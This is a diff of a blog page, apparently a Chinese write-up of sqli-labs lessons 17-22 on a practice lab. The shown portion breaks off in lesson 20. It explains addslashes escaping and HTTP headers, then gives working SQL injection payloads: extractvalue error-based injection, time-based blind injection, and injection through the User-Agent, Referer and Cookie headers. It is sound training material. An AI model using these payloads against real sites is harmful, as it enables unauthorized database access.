@@ -1,234 +1,234 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="osword">
-  <meta name="keywords" content="">
-  <title>sqlilabs17-22 - osword&#39;s blog</title>
+    
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+    
+
+    
 
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  
+    <meta charset="utf-8">
     
     
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-  
+    
+    <title>sqlilabs17-22 | osword&#39;s blog | 小刀</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="SQL注入">
+    <meta name="description" content="0x01 增删改基本语法插入操作本质含义，将数据以SQL的形式存储到指定的数据表（字段）Insert into 表名 [(字段列表)] values; 删除删数据：  delete from 表名  delete from 表名 where id&#x3D;16   删结构：  删数据库：drop database 数据库名;   删除表：drop table表名;   删除表中的列:alter table">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlilabs17-22">
+<meta property="og:url" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/index.html">
+<meta property="og:site_name" content="osword&#39;s blog">
+<meta property="og:description" content="0x01 增删改基本语法插入操作本质含义，将数据以SQL的形式存储到指定的数据表（字段）Insert into 表名 [(字段列表)] values; 删除删数据：  delete from 表名  delete from 表名 where id&#x3D;16   删结构：  删数据库：drop database 数据库名;   删除表：drop table表名;   删除表中的列:alter table">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/1.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/2.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/3.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/4.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/5.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/6.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/7.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/8.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/9.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/10.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/11.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/12.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/13.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/14.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/15.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/16.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/17.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/18.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/19.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/20.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/21.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/22.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/23.png">
+<meta property="og:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/24.png">
+<meta property="article:published_time" content="2018-12-20T10:54:37.000Z">
+<meta property="article:modified_time" content="2020-05-15T08:25:50.000Z">
+<meta property="article:author" content="osword">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhzhdoai.github.io/2018/12/20/sqlilabs17-22/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 
-  
+    <!-- custom head -->
+    
 
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+    <div id="loading" class="active"></div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">osword</h5>
+          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
+            <li class="waves-block waves-effect">
+              <a href="https://zhzhdoai.github.io/"  >
+                <i class="icon icon-lg icon-友链"></i>
+                友链
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
+            <li class="waves-block waves-effect">
+              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-glotozz"></i>
+                Glotozz
               </a>
             </li>
-          
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
+            <li class="waves-block waves-effect">
+              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-sommus"></i>
+                Sommus
               </a>
             </li>
-          
         
+            <li class="waves-block waves-effect">
+              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-mochazz@七月火"></i>
+                Mochazz 七月火
+              </a>
+            </li>
         
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-tea9"></i>
+                Tea 9
+              </a>
+            </li>
         
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
+            <li class="waves-block waves-effect">
+              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-Decade"></i>
+                Decade
+              </a>
+            </li>
         
       </ul>
     </div>
   </div>
-</nav>
+</aside>
 
-    <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container page-header text-center fade-in-up">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2018-12-20 18:54" pubdate>
-        2018年12月20日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      1.2k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      16
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">sqlilabs17-22</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
         </div>
-      </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
     </div>
-  </header>
+</header>
+<header class="content-header post-header">
 
-  <main>
-    
-      
-
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto" id="post">
-            <!-- SEO header -->
-            <h1 style="display: none">sqlilabs17-22</h1>
+    <div class="container fade-scale">
+        <h1 class="title">sqlilabs17-22</h1>
+        <h5 class="subtitle">
             
-            <div class="markdown-body" id="post-body">
-              <h1 id="0x01-增删改基本语法"><a href="#0x01-增删改基本语法" class="headerlink" title="0x01 增删改基本语法"></a>0x01 增删改基本语法</h1><h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h3><p>本质含义，将数据以SQL的形式存储到指定的数据表（字段）<br><code>Insert into 表名 [(字段列表)] values;</code></p>
+                <time datetime="2018-12-20T10:54:37.000Z" itemprop="datePublished" class="page-time">
+  2018-12-20
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x01-增删改基本语法"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x01 增删改基本语法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#插入操作"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">插入操作</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#删除"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">删除</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#修改"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">修改</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x02-less-17进入addslashes函数世界"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x02 less-17进入addslashes函数世界</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x03-addslashes函数学习"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x03 addslashes函数学习</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x04-less-18拐进HTTP头部世界"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x04 less-18拐进HTTP头部世界</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#源代码学习："><span class="post-toc-number">4.0.0.1.</span> <span class="post-toc-text">源代码学习：</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x05-less-19"><span class="post-toc-number">5.</span> <span class="post-toc-text">0x05 less-19</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x05-less-20-cookie小海浪"><span class="post-toc-number">6.</span> <span class="post-toc-text">0x05 less-20 cookie小海浪</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#源码学习与分析："><span class="post-toc-number">6.0.0.1.</span> <span class="post-toc-text">源码学习与分析：</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x06-less-21-试试一句话"><span class="post-toc-number">7.</span> <span class="post-toc-text">0x06 less-21 试试一句话</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x07-less-22-e…"><span class="post-toc-number">8.</span> <span class="post-toc-text">0x07 less-22 e….</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-sqlilabs17-22"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">sqlilabs17-22</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-12-20 18:54:37" datetime="2018-12-20T10:54:37.000Z"  itemprop="datePublished">2018-12-20</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="0x01-增删改基本语法"><a href="#0x01-增删改基本语法" class="headerlink" title="0x01 增删改基本语法"></a>0x01 增删改基本语法</h1><h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h3><p>本质含义，将数据以SQL的形式存储到指定的数据表（字段）<br><code>Insert into 表名 [(字段列表)] values;</code></p>
 <h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删数据：</p>
 <ul>
 <li><p><code>delete from 表名</code></p>
@@ -245,8 +245,32 @@
 <li><p>删除表中的列:alter table表名drop column列名;</p>
 </li>
 </ul>
-<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p><code>updata 表名 set 字段名 = 新值 [where 条件] ，非数字加引号；</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="0x02-less-17进入addslashes函数世界"><a href="#0x02-less-17进入addslashes函数世界" class="headerlink" title="0x02 less-17进入addslashes函数世界"></a>0x02 less-17进入addslashes函数世界</h1><p>开始正题<br>uname=admin<br>passwd=1’ 可得如图报错<br>在passwd处有单引号，构造payload: <code>1&#39;#</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""><br>Xpath报错注入：<code>uname=admin&amp;passwd=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;submit=Submit</code>，其他盲注也是OK就不啰嗦了。<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
+<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p><code>updata 表名 set 字段名 = 新值 [where 条件] ，非数字加引号；</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="0x02-less-17进入addslashes函数世界"><a href="#0x02-less-17进入addslashes函数世界" class="headerlink" title="0x02 less-17进入addslashes函数世界"></a>0x02 less-17进入addslashes函数世界</h1><p>开始正题<br>uname=admin<br>passwd=1’ 可得如图报错<br>在passwd处有单引号，构造payload: <code>1&#39;#</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>Xpath报错注入：<code>uname=admin&amp;passwd=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;submit=Submit</code>，其他盲注也是OK就不啰嗦了。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>源码对unname字符进行转义处理无法使用uname注入</p>
 <h1 id="0x03-addslashes函数学习"><a href="#0x03-addslashes函数学习" class="headerlink" title="0x03 addslashes函数学习"></a>0x03 addslashes函数学习</h1><ol>
 <li><p><code>addslashes()</code>：为数据库查询语句需要的某些字符添加反斜线转义。单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。强烈建议使用 DBMS 指定的转义函数 （比如 MySQL 是<code>mysqli_real_escape_string()</code>，PostgreSQL 是 <code>pg_escape_string()</code>）</p>
@@ -255,286 +279,487 @@
 </li>
 <li><p><code>ctype_digit($value)</code>:判断value是否为纯数字</p>
 </li>
-<li><p><code>stripslashes()</code>:反引用一个引用字符串。如果 <code>magic_quotes_sybase</code> 项开启，反斜线将被去除，但是两个反斜线将会被替换成一个。<br><img src="./4.png" srcset="/img/loading.gif" alt=""><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
+<li><p><code>stripslashes()</code>:反引用一个引用字符串。如果 <code>magic_quotes_sybase</code> 项开启，反斜线将被去除，但是两个反斜线将会被替换成一个。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 </li>
 </ol>
-<h1 id="0x04-less-18拐进HTTP头部世界"><a href="#0x04-less-18拐进HTTP头部世界" class="headerlink" title="0x04 less-18拐进HTTP头部世界"></a>0x04 less-18拐进HTTP头部世界</h1><p>本节开始学习header injection<br>查看源代码发现传入的uname 和 passwd特殊字符都被addslashes函数转义。<br><img src="./6.png" srcset="/img/loading.gif" alt=""><br>HTTP头部学习：<br>1、<code>Aceept</code>：告诉WEB服务器自己接收什么介质类型，<em>/</em>表示任何类型，type/*表示该类型下的所有自类型<br>2、<code>Accept-Charset</code>：浏览器申明自己接收的字符集<br>    <code>Accept-Encoding</code>: 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法(gzip,deflate)<br>    <code>Accept-Language</code>：浏览器申明自己接收的语言。big5,gb2312,gbk<br>3、<code>Connetion</code>：浏览器与服务器之间连接的类型<br>4、<code>Cookie</code>：当前页面设置的cookie<br>5、<code>Host</code>：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号。例如：Host： rss.sina.com.cn<br>6、<code>Referer</code>：发出请求的页面的URI。<br>7、<code>User-Agent</code>：浏览器的用户代理字符串<br>8、<code>Server</code>: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)</p>
+<h1 id="0x04-less-18拐进HTTP头部世界"><a href="#0x04-less-18拐进HTTP头部世界" class="headerlink" title="0x04 less-18拐进HTTP头部世界"></a>0x04 less-18拐进HTTP头部世界</h1><p>本节开始学习header injection<br>查看源代码发现传入的uname 和 passwd特殊字符都被addslashes函数转义。 </p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>HTTP头部学习：<br>1、<code>Aceept</code>：告诉WEB服务器自己接收什么介质类型，<em>/</em>表示任何类型，type/*表示该类型下的所有自类型<br>2、<code>Accept-Charset</code>：浏览器申明自己接收的字符集<br>    <code>Accept-Encoding</code>: 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法(gzip,deflate)<br>    <code>Accept-Language</code>：浏览器申明自己接收的语言。big5,gb2312,gbk<br>3、<code>Connetion</code>：浏览器与服务器之间连接的类型<br>4、<code>Cookie</code>：当前页面设置的cookie<br>5、<code>Host</code>：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号。例如：Host： rss.sina.com.cn<br>6、<code>Referer</code>：发出请求的页面的URI。<br>7、<code>User-Agent</code>：浏览器的用户代理字符串<br>8、<code>Server</code>: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)</p>
 <h4 id="源代码学习："><a href="#源代码学习：" class="headerlink" title="源代码学习："></a>源代码学习：</h4><p><code>$_SERVER</code>[ ]:返回HTTP头部信息。<br>参数:</p>
 <ul>
 <li><code>HTTP_USER_AGENT</code>：返回HTTP头部的<code>USER_AGENT</code></li>
-<li><code>REMOTE_ADDR</code>：返回http头部IP地址<br><img src="./7.png" srcset="/img/loading.gif" alt=""></li>
+<li><code>REMOTE_ADDR</code>：返回http头部IP地址<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+</li>
 </ul>
-<p>判断uname和passwd是否匹配<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p>
-<p>匹配成功之后插入到数据库(符号` 在数据库合法，表示字符串的含义)<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p>
-<p>正确信息回显<code>your user agent is :..</code> 可知采用<code>header injection</code><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p>
-<p>payload构造：<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39; = &#39;1</code> /<br>            <code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code><br>            *：红色的首末两个个引号起到闭合引号的作用，使得extractvalue语句不会是字符串形式。<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p>
-<p>爆数据库<code>&#39;and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))  and &#39;1&#39;=&#39;1</code><br>bool盲注：<code>&#39;or if(ascii(substr((select database()),1,1))=114,1,sleep(5))  and &#39;1&#39;=&#39;1（and不管用）</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p>
-<h1 id="0x05-less-19"><a href="#0x05-less-19" class="headerlink" title="0x05 less-19"></a>0x05 less-19</h1><p>正确登陆回显<code>Your Referer is: http://127.0.0.1/sqlilabs/Less-19</code><br>可以判断为header injection -<code>Referer</code> 为注入点<br>原始语句：<code>Referer: http://127.0.0.1/sqlilabs/Less-19/</code><br><img src="./13.png" srcset="/img/loading.gif" alt=""></p>
-<p>payload语句：传入字符串所以需要对引号进行闭合。<br><code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code><br><code>&#39;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#39;1&#39;=&#39;1</code><br><img src="./14.png" srcset="/img/loading.gif" alt=""><br><img src="./15.png" srcset="/img/loading.gif" alt=""><br>其他注入点就不一一赘述了。</p>
+<p>判断uname和passwd是否匹配</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>匹配成功之后插入到数据库(符号` 在数据库合法，表示字符串的含义)</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>正确信息回显<code>your user agent is :..</code> 可知采用<code>header injection</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>payload构造：<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39; = &#39;1</code> /<br>            <code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code><br>            *：红色的首末两个个引号起到闭合引号的作用，使得extractvalue语句不会是字符串形式。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>爆数据库<code>&#39;and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))  and &#39;1&#39;=&#39;1</code><br>bool盲注：<code>&#39;or if(ascii(substr((select database()),1,1))=114,1,sleep(5))  and &#39;1&#39;=&#39;1（and不管用）</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="0x05-less-19"><a href="#0x05-less-19" class="headerlink" title="0x05 less-19"></a>0x05 less-19</h1><p>正确登陆回显<code>Your Referer is: http://127.0.0.1/sqlilabs/Less-19</code><br>可以判断为header injection -<code>Referer</code> 为注入点<br>原始语句：<code>Referer: http://127.0.0.1/sqlilabs/Less-19/</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./13.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>payload语句：传入字符串所以需要对引号进行闭合。<br><code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code><br><code>&#39;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#39;1&#39;=&#39;1</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./14.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./15.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>其他注入点就不一一赘述了。</p>
 <h1 id="0x05-less-20-cookie小海浪"><a href="#0x05-less-20-cookie小海浪" class="headerlink" title="0x05 less-20 cookie小海浪"></a>0x05 less-20 cookie小海浪</h1><p><code>cookie</code>：GET请求所携带的用户信息，结构为–键,值,时间<br>网页正确回显依赖数据库对cookie的验证。构造cookie dump</p>
 <ul>
-<li>payload：<code>‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#39;1&#39;=&#39;1</code><br><img src="./16.png" srcset="/img/loading.gif" alt=""><br><img src="./17.png" srcset="/img/loading.gif" alt=""></li>
+<li>payload：<code>‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#39;1&#39;=&#39;1</code><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./16.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="./17.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+</li>
 </ul>
-<h4 id="源码学习与分析："><a href="#源码学习与分析：" class="headerlink" title="源码学习与分析："></a>源码学习与分析：</h4><p>输入正确的账号密码，执行setcookie(‘uname’,$cookee,time()+3600)函数，跳转界面（刷新）<br><img src="./18.png" srcset="/img/loading.gif" alt=""></p>
